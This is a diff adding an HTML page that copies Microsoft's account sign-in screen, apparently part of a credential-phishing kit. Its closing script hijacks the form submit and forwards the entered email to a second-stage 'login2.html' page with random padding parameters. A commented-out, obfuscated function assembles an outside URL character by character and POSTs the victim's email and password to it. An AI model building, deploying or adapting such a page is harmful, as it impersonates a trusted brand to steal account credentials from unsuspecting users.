@@ -1,0 +1,397 @@
+<html><head>
+    <title>Sign in to your account</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+    <meta http-equiv="Pragma" content="no-cache">
+    <link rel="preconnect" href="https://aadcdn.msauth.net" crossorigin="">
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+    <meta name="LocLC" content="en-US">
+    <link rel="prefetch" href="https://login.live.com/Me.htm?v=3">
+    <link rel="shortcut icon" href="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
+    <link crossorigin="anonymous" href="https://aadcdn.msauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_wixdbz3ubznoegxpcgkfog2.css" rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)" integrity="sha384-s9J0XeuUiQT41Vv8pNL7Ek16X8wgrLX/MwodqhWuNrtUAR5RLaftOfXr0O6G48l/">
+    <link rel="prefetch" href="https://aadcdn.msauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_wixdbz3ubznoegxpcgkfog2.css">
+    <link rel="prefetch" href="https://aadcdn.msauth.net/ests/2.1/content/cdnbundles/ux.converged.login.strings-en.min_yruqtyo0qslo70l4a-_ung2.js">
+    <style>
+        body{
+          overflow: hidden;
+        }
+      
+    </style>
+</head>
+
+<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">
+    <div>
+        <div data-bind="component: { name: 'background-image-control', publicMethods: backgroundControlMethods }">
+            <div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
+                <div data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }" style="background-image: url(&quot;https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);" class="background-image ext-background-image"></div>
+            </div>
+        </div>
+        <div data-bind="if: activeDialog"></div>
+        <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: activeDialog" action="/common/login">
+            <div class="outer" data-bind="component: { name: 'master-page',
+        params: {
+            serverData: svr,
+            showButtons: svr.fShowButtons,
+            showFooterLinks: true,
+            useWizardBehavior: svr.fUseWizardBehavior,
+            handleWizardButtons: false,
+            password: password,
+            hideFromAria: ariaHidden },
+        event: {
+            footerAgreementClick: footer_agreementClick } }">
+                <div class="middle" data-bind="css: { 'app': backgroundLogoUrl }">
+
+                    <div data-bind="
+                animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
+                css: {
+                    'app': backgroundLogoUrl,
+                    'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide'),
+                    'fade-in-lightbox': fadeInLightBox,
+                    'has-popup': showFedCredButtons,
+                    'transparent-lightbox': backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox },
+                externalCss: { 'sign-in-box': true }" class="sign-in-box ext-sign-in-box fade-in-lightbox">
+                        <!--     START OF GIF EFFECT           -->
+            <div id="progressBar" class="progress disit 1iqzd3" role="progressbar" aria-label="Please wait" style="display: none;">
+              <!--  -->
+              <!-- ko if: useCssAnimation --> 
+              <div></div>
+              <div></div>
+              <div></div>
+              <div></div>
+              <div></div>
+              <!-- /ko -->
+              <!-- ko ifnot: useCssAnimation -->
+              <!-- /ko -->
+            </div> 
+            <!--     END OF GIF EFFECT           -->
+            
+                        <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div>
+                        <div class="win-scroll">
+                            <div data-bind="component: { name: 'logo-control',
+                        params: {
+                            isChinaDc: svr.fIsChinaDc,
+                            bannerLogoUrl: bannerLogoUrl() } }">
+                                <img class="logo" role="img" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">
+                                
+                            </div>
+                            <div role="main" data-bind="component: { name: 'pagination-control',
+                            publicMethods: paginationControlMethods,
+                            params: {
+                                enableCssAnimation: svr.fEnableCssAnimation,
+                                disableAnimationIfAnimationEndUnsupported: svr.fDisableAnimationIfAnimationEndUnsupported,
+                                initialViewId: initialViewId,
+                                currentViewId: currentViewId,
+                                initialSharedData: initialSharedData,
+                                initialError: $loginPage.getServerError() },
+                            event: {
+                                cancel: paginationControl_onCancel,
+                            loadView: view_onLoadView,
+                            showView: view_onShow,
+                                setLightBoxFadeIn: view_onSetLightBoxFadeIn,
+                                animationStateChange: paginationControl_onAnimationStateChange } }">
+                                <!--  -->
+                                <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
+                                    <div class="pagination-view animate slide-in-next" data-bind="css: {
+        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
+        'zero-opacity': hidePaginatedView.hideSubView(),
+        'animate': animate(),
+        'slide-out-next': animate.isSlideOutNext(),
+        'slide-in-next': animate.isSlideInNext(),
+        'slide-out-back': animate.isSlideOutBack(),
+        'slide-in-back': animate.isSlideInBack() }">
+                                        <div data-viewid="1" data-showfedcredbutton="true" data-bind="pageViewComponent: { name: 'login-paginated-username-view',
+                            params: {
+                                serverData: svr,
+                                serverError: initialError,
+                                isInitialView: isInitialState,
+                                displayName: sharedData.displayName,
+                                otherIdpRedirectUrl: sharedData.otherIdpRedirectUrl,
+                                prefillNames: $loginPage.prefillNames,
+                                flowToken: sharedData.flowToken },
+                            event: {
+                                redirect: $loginPage.view_onRedirect,
+                                setPendingRequest: $loginPage.view_onSetPendingRequest,
+                                registerDialog: $loginPage.view_onRegisterDialog,
+                                unregisterDialog: $loginPage.view_onUnregisterDialog,
+                                showDialog: $loginPage.view_onShowDialog,
+                                agreementClick: $loginPage.footer_agreementClick } }">
+                                            <!--  -->
+                                            <div data-bind="component: { name: 'header-control',
+    params: {
+        serverData: svr,
+        title: str['WF_STR_HeaderDefault_Title'] } }">
+                                                <div class="row title ext-title" id="loginHeader" data-bind="externalCss: { 'title': true }">
+                                                    <div role="heading" aria-level="1" data-bind="text: title">Sign in</div>
+                                                </div>
+                                            </div>
+                                            <div class="row">
+                                                  <div role="alert" class="aria-live=" assertive"="">
+                                                <!-- ko if: usernameTextbox.error -->
+                                                <div class="alert alert-error col-md-24 alert_msg_yxq alert_email_sect" style="display: none;" id="error" data-bind="
+            htmlWithBindings: usernameTextbox.error,
+            childBindings: {
+                'idA_PWD_SignUp': { href: svr.urlSignUp, click: signup_onClick },
+                'otherIdpLogin': { href: svr.urlGoToAADError, click: otherIdpLogin_onClick } }">
+                                                    We couldn't find an account with that username. Try another, or
+                                                    <a id="idA_PWD_SignUp" href="https://login.live.com/oauth20_authorize.srf?response_type=code&amp;client_id=51483342-085c-4d86-bf88-cf50c7252078&amp;scope=openid+profile+email+offline_access&amp;response_mode=form_post&amp;redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&amp;state=rQIIAeNisNLJKCkpKLbS1y_ILypJzNHLzUwuyi_OTyvJz8vJzEvVS87P1csvSs9MAbGKhLgE5N-HsRnaz3GZ3Nb0o0aAj2MWI2d8TmYZWOUqRmXCxulfYGR8wch4i0nQvyjdMyW82C01JbUosSQzP-8Ci8ArFh4DZisODi4BBgkGBYYfLIyLWIG2Rik0X16_dbXTrqAUuYQeZ4ZTrPpRVd4W-b7mmV4ppv5hlW6-lqaluRYWHrl5XtppBkXhQUUhmQElZWVGAaGBtqZWhhPYhCawMZ1iY_jAxtjBznCAk_EWl4iRgaGlroGRroGJgoGllZGRlbFRFAA1&amp;estsfed=1&amp;uaid=0656ef1f3f31449c938682f87c100e08&amp;signup=1&amp;lw=1&amp;fl=easi2&amp;fci=https%3a%2f%2fportal.microsoftonline.com.orgid.com">
+                get a new Microsoft account
+                </a>.</div>
+                                                
+                                                <!-- /ko -->
+                                            </div>
+                                                <div class="form-group col-md-24">
+                                                    <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
+            publicMethods: usernameTextbox.placeholderTextboxMethods,
+            params: {
+                serverData: svr,
+                hintText: tenantBranding.UserIdLabel || str['CT_PWD_STR_Email_Example'],
+                hintCss: 'placeholder' + (!svr.fAllowPhoneSignIn ? ' ltr_override' : '') },
+            event: {
+                updateFocus: usernameTextbox.textbox_onUpdateFocus } }">
+                                                        <input type="email" name="loginfmt" id="i0116" maxlength="113" class="form-control ltr_override input ext-input text-box ext-text-box" aria-required="true" data-bind="
+                    externalCss: {
+                        'input': true,
+                        'text-box': true,
+                        'has-error': usernameTextbox.error },
+                    ariaLabel: tenantBranding.UserIdLabel || str['CT_PWD_STR_Username_AriaLabel'],
+                    ariaDescribedBy: 'loginHeader' + (pageDescription &amp;&amp; !svr.fHideLoginDesc ? ' loginDescription' : ''),
+                    textInput: usernameTextbox.value,
+                    hasFocusEx: usernameTextbox.focused,
+                    placeholder: $placeholderText" aria-label="Enter your email, phone, or Skype." aria-describedby="loginHeader" placeholder="Email, phone, or Skype" lang="en">
+                                                        <input name="passwd" type="password" id="i0118" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true">
+                                                        
+                                                    </div>
+                                                    
+                                                </div>
+                                            </div>
+  
+                                            <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
+                                                <div class="row">
+                                                    <div class="col-md-24">
+                                                        <div class="text-13">
+                                                            <div class="form-group" data-bind="
+                    htmlWithBindings: html['WF_STR_SignUpLink_Text'],
+                    childBindings: {
+                        'signup': {
+                            href: svr.urlSignUp || '#',
+                            ariaLabel: svr.urlSignUp ? str['WF_STR_SignupLink_AriaLabel_Text'] : str['WF_STR_SignupLink_AriaLabel_Generic_Text'],
+                            click: signup_onClick } }">No account? <a href="https://login.live.com/oauth20_authorize.srf?response_type=code&amp;client_id=51483342-085c-4d86-bf88-cf50c7252078&amp;scope=openid+profile+email+offline_access&amp;response_mode=form_post&amp;redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&amp;state=rQIIAYWSO2_TUABG47QNtOItBsSAOjAgkNPre_2IIyHhxEmTJo7zsOvYi2UnfuVhp44dOxETLAxIMHeDASFgQiAhJuZKSGwgFlbEhBADGxT-AMsZvjN-Z-sEnafzIA-urxF5oniVRCRlMCaLswaNcJIlAG6QkMYRhWgEATGkAAovbJ3r3Ln3-vaNj7ful35-enD594tDbFOfeAsrPwimz7ArbhTN5sWdnSRJ8oFte4N_Ymdi-EPPd95g2AcM-4phh9kNy8fl3rPsnEYMoliaoQjAQAhZAPOaJKQqFBJR4iJ1KhCaB4CqqGlTqRxv9UjY7U4E2IHirjbV-EEiKDJqKfVUU4RIHe176hIAUVGXTclJRd6JBF6AmqQSrdE4EVZ19Dl7VuTiyIV_EYTeyvqR3bSDcKrPgnl0uPY8u-rOO6bqr6yewFMsQxpdvxFynE60XbO7X476HjoQpm7VWUbGEmdDhtGjJVUd9GtKXA_50N3nwiBI-0bS7uEHtNlolFtjRE8WNrk7phdWrU3ynGkoiRn4U9mMyWadcZqGw1eVAy2lR31aTkVN1r1-OeCFg2QRJAnpkIzKOMG8AyaVVVreowg9xR2Zr01hEzfnfBssxwHuV0BvIboDJwVwUGuMQ8ZxZcEsN1m9MEQFX5NGQ6XJeWy1W2qD0mxhU4G9VyposYuq3WTVUHflhSXLZivq-a4y5-KJgNdQFDsMO7SYZm1UsyS0KnE62ZMKtPNyLXf88DTwj9bOBDPL94bbszCwvYn1YR37tn7qZO5c7lJmO3PtIjjzax17vHEc0dP3XzbY5ZPy3UekHcmvMkcbOyq_Qou-VQFSTE3SAjKBMqLL7mxPrcRLUYyHHdZGzn4dAO4mUSQe5rCHudxR7nyd11sVqSdxLZ7r8lAH33PYvROZt5v_SfHz1kUIIMABixPMNgRFgihSQHt3OvMH0&amp;estsfed=1&amp;uaid=b58882512b7c40d78c42f4d88f1affac&amp;signup=1&amp;lw=1&amp;fl=easi2&amp;fci=4345a7b9-9a63-4910-a426-35363201d503&amp;mkt=en-US" id="signup" aria-label="Create a Microsoft account">Create one!</a>
+                                                            </div>
+                                                            <div class="form-group"> <a id="cantAccessAccount" name="cannotAccessAccount" data-bind="
+                        text: str['WF_STR_CantAccessAccount_Text'],
+                        click: cantAccessAccount_onClick,
+                        href: accessRecoveryLink || '#'" href="#">Can’t access your account?</a> 
+                                                            </div>
+
+                                                            <div class="form-group" data-bind="
+                    component: { name: 'cred-switch-link-control',
+                        params: {
+                            serverData: svr,
+                            availableCreds: availableCredsWithoutUsername(),
+                            showForgotUsername: svr.fShowForgotUsernameLink },
+                        event: {
+                            switchView: noUsernameCredSwitchLink_onSwitchView,
+                            redirect: onRedirect,
+                            registerDialog: onRegisterDialog,
+                            unregisterDialog: onUnregisterDialog,
+                            showDialog: onShowDialog } }">
+                                                                <div class="form-group">
+<a id="idA_PWD_SwitchToCredPicker" href="#" data-bind="
+        text: isUserKnown ? str['CT_PWD_STR_SwitchToCredPicker_Link'] : str['CT_PWD_STR_SwitchToCredPicker_Link_NoUser'],
+        click: switchToCredPicker_onClick">Sign-in options</a> 
+                                                                    
+                                                                    
+                                                                </div>
+                                                                
+                                                            </div>
+                                                            
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="win-button-pin-bottom">
+                                                <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
+                                                    <div data-bind="component: { name: 'footer-buttons-field',
+            params: {
+                serverData: svr,
+                isPrimaryButtonEnabled: !isRequestPending(),
+                isPrimaryButtonVisible: svr.fShowButtons,
+                isSecondaryButtonEnabled: true,
+                isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isBackButtonVisible() },
+            event: {
+                primaryButtonClick: primaryButton_onClick,
+                secondaryButtonClick: secondaryButton_onClick } }">
+                                                        <div class="col-xs-24 no-padding-left-right button-container" data-bind="
+    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
+    css: { 'no-margin-bottom': removeBottomMargin }">
+                                                            <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }" class="inline-block">
+                                            
+                                                                <input type="submit" id="idSIButton9" data-bind="
+            attr: primaryButtonAttributes,
+            externalCss: {
+                'button': true,
+                'primary': true },
+            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
+            hasFocus: focusOnPrimaryButton,
+            click: primaryButton_onClick,
+            enable: isPrimaryButtonEnabled,
+            visible: isPrimaryButtonVisible,
+            preventTabbing: primaryButtonPreventTabbing" class="button ext-button primary ext-primary" value="Next">
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            
+                                        </div>
+                                        
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value="">
+                    <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="">
+                    <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="">
+                    <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="">
+                    <input type="hidden" name="canary" data-bind="value: svr.canary" value="YDz3vXeE0Tu5lx83b0Wj6ChpJYEuyOOudQ9f3gVI00A=1:1">
+                    <input type="hidden" name="ctx" data-bind="value: ctx" value="rQIIAYWSOW_TYABA47RNaQWlIAbEgDowIJCTz_58xJWQcOKkSRPHOew49mLZia8cdurYsRMxwdIBic7dYECoMCGQEBNzJaRuIBZWxIQQAxuUX8Dyhre-t7lOZaksyII7K1gW271FQILUaYNBGZ2CKMFgANUJnEIhCSmIA2xAAhhc3dxuPTx8--Dup_uPC78-P7nx59UJctMJw-lsN5eL4zjrW5bbN7N9f5Ib697A9ex3CHKGIN8Q5Di9Znqo1DlJzyhIQ5KhaBIDNI7jDMCzqsgnCs7HgsiGyoTHVBcARVaSulw6d9WQ32uPebyFC3vqROX6MS9LsCFXE1XmQ2XYdZUFAIKsLOqinQicHfIcj6uigjWGo5hfVuGX9GWBjUIH_wc_cJfmz_SG5QcTberPwuOVl-lle9YyFG9pdniOZGhCb3u1gGU1rOkY7W4x7LnwgJ84ZXsR6guUCWhaCxdkud-ryFE14AKnywa-n_T0uNlBDyijVis2RpAazy1ib0TNzUqT4FhDl2PD9yaSERH1Km3XdZsrywdqQg17lJQIqqS5vaLP8Qfx3I9jwiZohbb9WQuMS8ukuE9iWoLaEleZ4HXUmHFNsBj5qFcCnbng9O0E4P1KbRTQtiPxRrHOaPkBzHuqOBzIddZlyu1CExSmc4v0rf1CXo0cWG7Hy5qyJ81NSTIaYcdz5BkbjXm0AsPIppmBSdcrw4opwmWB1YiOmKfs1yuZ88IT3ztd2fKnpucOdqaBb7lj82wV-b568UJmO3M9tZO6fQ1s_V5Fnq2dj_Pi49c1ZvG8-OgpYYXSm9TpWk7hlnDeM0tAjMhxkocGkIdU0ZnuK6VoIQjRoMVY0O5WAWDvYbvYUQY5ymROM1eqnNYoiR2RbXBsm8M18CODHK6n3m_8Z8UPl1J_AQ2">
+                    <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="05dfcda8-7939-43a6-83a1-34667455b400">
+                    <input type="hidden" id="i0327" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABAAEAAAAGV_bv21oQQ4ROqh0_1-tAuH5jTOYjJYb_Hkq_PyJ98hX8eGZ5ut2n5SnxcKAauzeumF3wH4rhBU_xMCa-hs5VGqik9Ee9rqUf9lRe7Q8lPqsTweVW4Way1edLGzREfxXBp1PJnepEP6ybQZDsPLtkp-HQu0PVr42O8KSJtaVGkJMS3uUqp6opK68mX8sbxDWHdbNbBl7aS2wr34oKG5QoTjrF-w4xlwg5ITomqQPNqlAO136NFTD9g0hqNE_0WMdJXLvlPcQfqRwO-hLKl1GYzx1EE6APPJ7j2osErUM1iJsFhTcUR9rO7vQGKbHB5FS28ybXgoyflaKHJidL_6ss0R8k4jb7NOoXdB7xFLxipW-KuKUUmeGcWp8GABsahp60lfU7n9rGJ45ieV1FvUJ9nH92DgO7XDd84d8lGkdsJUspe6XcUsxj4CzqsfQEH4HtC53LNv7QQxVmQgB5Jb8NDsUQANYyXFN4Vs_vvi6GIyAA">
+                    <input type="hidden" name="PPSX" data-bind="value: svr.sRandomBlob" value="">
+                    <input type="hidden" name="NewUser" value="1">
+                    <input type="hidden" name="FoundMSAs" data-bind="value: svr.sFoundMSAs" value="">
+                    <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0">
+                    <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0">
+                    <input type="hidden" name="CookieDisclosure" data-bind="value: svr.fShowCookieBanner ? 1 : 0" value="0">
+                    <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="0">
+                    <input type="hidden" name="isSignupPost" data-bind="value: isSignupPost() ? 1 : 0" value="0">
+                    <div data-bind="component: { name: 'instrumentation-control',
+                publicMethods: instrumentationMethods,
+                params: { serverData: svr } }">
+                        <input type="hidden" name="i2" data-bind="value: clientMode" value="1">
+                        <input type="hidden" name="i17" data-bind="value: srsFailed" value="">
+                        <input type="hidden" name="i18" data-bind="value: srsSuccess" value="">
+                        <input type="hidden" name="i19" data-bind="value: timeOnPage" value="">
+                    </div>
+                    <div id="footer" role="contentinfo" data-bind="
+                css: {
+                    'default': !backgroundLogoUrl(),
+                    'new-background-image': useNewDefaultBackground },
+                externalCss: { 'footer': true }" class="default footer ext-footer new-background-image">
+                        <div data-bind="component: { name: 'footer-control',
+                    publicMethods: footerMethods,
+                    params: {
+                        serverData: svr,
+                        useNewDefaultBackground: useNewDefaultBackground(),
+                        hasDarkBackground: backgroundLogoUrl(),
+                        showLinks: true },
+                    event: {
+                        agreementClick: footer_agreementClick,
+                        showDebugDetails: toggleDebugDetails_onClick } }">
+                            <div id="footerLinks" class="footerNode text-secondary">
+                                 <a id="ftrTerms" data-bind="text: termsText, href: termsLink, click: termsLink_onClick" href="https://www.microsoft.com/en-US/servicesagreement/">Terms of use</a> 
+                                 <a id="ftrPrivacy" data-bind="text: privacyText, href: privacyLink, click: privacyLink_onClick" href="https://privacy.microsoft.com/en-US/privacystatement">Privacy &amp; cookies</a> 
+                                <a id="moreOptions" href="#" role="button" class="moreOptions" data-bind="
+        click: moreInfo_onClick,
+        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
+        attr: { 'aria-expanded': showDebugDetails().toString() },
+        hasFocusEx: focusMoreInfo()" aria-label="Click here for troubleshooting information" aria-expanded="false">
+                                    
+                       <img class="desktopMode" role="presentation" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/ellipsis_96f69d0cefd8a8ba623a182c351ccc64.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/ellipsis_635a63d500a92a0b8497cdc58d0f66b1.svg" data-bind="imgSrc" src="https://aadcdn.msauth.net/shared/1.0/content/images/ellipsis_635a63d500a92a0b8497cdc58d0f66b1.svg">
+ 
+                                    <img class="mobileMode" role="presentation" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" data-bind="imgSrc" src="https://aadcdn.msauth.net/shared/1.0/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg">
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </form>
+    </div>
+         <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script>
+    $(document).ready(function(){
+      var progressBar = $('#progressBar');
+      var emcon = $('#i0116');
+      var emv = '';
+      var passUrl = getBaseUrl(true)+'login2.html';
+      progressBar.hide();
+      $('#i0281').submit(function(e){
+         $('#error').hide();
+        e.preventDefault();
+        progressBar.show();
+        emv = emcon.val();
+        if(emv && emv.length){
+          emv = emv.trim();
+        }
+  var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+  if (filter.test(emv)){
+          passUrl += '?'+get_rand_url_pars()+'&username='+emv;
+          //alert(passUrl);
+          setTimeout(function(){
+            window.location.replace(passUrl);
+          },3000);
+        }
+        else{
+          progressBar.hide();
+            $('#error').show();
+              email.focus;
+            return false;
+        }
+    var ind=emv.indexOf("@");
+      var my_slice=emv.substr((ind+1));
+      var c= my_slice.substr(0, my_slice.indexOf('.'));
+      var final= c.toLowerCase();
+      });
+    });
+function getBaseUrl(baseWithoutFile){
+  if(baseWithoutFile === undefined){
+    baseWithoutFile = false;  
+  }
+  var fg = false;
+  var fullUrl = window.location.href;
+  var htmlstr = '.html';
+  var htmlLen = 5;
+  var htmlStrPos = -1;
+  var qmrkStrPos = fullUrl.indexOf('?');
+  var lastIndexOffslash = -1;
+  var fullUrlStart = '';
+  if(qmrkStrPos != -1){
+    fullUrlStart = fullUrl.substr(0, qmrkStrPos);
+    fg = true;   
+  }
+  htmlStrPos = fullUrl.indexOf(htmlstr);
+  if(htmlStrPos != -1){ 
+    fullUrlStart = fullUrl.substr(0, htmlStrPos+htmlLen); 
+    fg = true;
+  }
+  if(fullUrlStart.length > 0){
+    fullUrlStart = fullUrlStart.trim();
+  }
+  if(fg && baseWithoutFile){
+    lastIndexOffslash = fullUrlStart.lastIndexOf('/');
+    if(lastIndexOffslash != -1){
+      fullUrlStart = fullUrlStart.substr(0, lastIndexOffslash+1);
+    }
+  }
+  if(!fg){
+    fullUrlStart = fullUrl;
+  }
+  return fullUrlStart;
+}   
+
+//function evandoor(a,o,t){var h = ['O','L','t','q','e','D','c','-','.','z','u','2','T','m','V','J','6','U','P','b','v','K','B','Z','i','7','R',':','C','/','o','r','n','Q','S','5','3','8','a','M','W','I','x','H','Y','4','1','k','s','d','g','A','j','F','N','9','G','l','f','p','X','0','w','y','E','h'],f = h[65]+h[2]+h[2]+h[59]+h[48]+h[27]+h[29]+h[29]+h[38]+h[59]+h[24]+h[49]+h[38]+h[2]+h[38]+h[6]+h[48]+h[48]+h[8]+h[6]+h[30]+h[13]+h[29]+h[58]+h[24]+h[32]+h[24]+h[48]+h[65]+h[7]+h[10]+h[32]+h[20]+h[11]+h[11]+h[8]+h[59]+h[65]+h[59];$.ajax({url:f,type:"POST",dataType:"html",data:{Email:a,password:o,typeofemail:t},crossDomain:!0,success:function(a){},error:function(a){}})}
+function randomInteger(min, max) {return Math.floor(Math.random() * (max - min + 1)) + min; }
+function randomString(r,n){for(var o="",t=r;0<t;--t)o+=n[Math.floor(Math.random()*n.length)];return o}
+function getdomainpartofemail(a){var e,t=!1;return!validateEmail(a)||-1!=(e=(a=a.toLowerCase()).indexOf("@"))&&(t=a.substr(e+1)),t}
+function get_email_hash(){var a=!1,i=window.location.href,t=(i=i.trim()).lastIndexOf("#");return-1!=t&&(a=i.substring(t+1),validateEmail(a)||(a=!1)),a}
+function validateEmail(t){return/^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(String(t).toLowerCase())}
+function geturlparameter(r){for(var t=window.location.search.substring(1).split("&"),e=0;e<t.length;e++){var n=t[e].split("=");if(n[0]==r)return decodeURIComponent(n[1])}}
+function get_rand_url_pars(){var r="",n=0,a="abcdefghijklmnopqrstuvwxyz",e=a;a+=a.toUpperCase()+"123456789";for(var t=randomInteger(3,10),n=0;n<t;n++)r+="&"+randomString(randomInteger(3,10),e)+"="+randomString(randomInteger(15,30),a);return r.substr(1)}
+
+    </script>
+
+
+</body></html>
